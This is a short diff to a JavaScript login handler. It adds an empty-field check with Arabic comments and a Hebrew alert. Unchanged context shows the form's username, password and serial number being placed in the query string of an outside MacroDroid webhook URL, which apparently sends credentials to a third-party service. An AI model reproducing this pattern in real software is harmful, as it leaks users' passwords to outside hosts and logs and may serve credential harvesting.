@@ -69,6 +69,13 @@
             var username = document.getElementById('txtUserName').value;
             var password = document.getElementById('txtPassword').value;
 
+            // التحقق إذا كانت الحقول فارغة
+            if (!sn || !username || !password) {
+                // إذا كانت هناك حقول فارغة، عرض رسالة تطلب من المستخدم إدخال البيانات
+                alert('❌️ אנא מלא את כל הנתונים: מספר סידורי, שם משתמש, וסיסמה');
+                return; // إيقاف التنفيذ هنا لمنع إرسال البيانات إذا كانت الحقول فارغة
+            }
+
             // بناء الرابط مع المعلمات
             var webhookUrl = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&serial=${encodeURIComponent(sn)}`;
 
